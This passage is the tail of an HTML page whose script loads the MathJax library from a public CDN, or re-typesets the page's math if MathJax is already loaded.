    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  

</body>
</html>
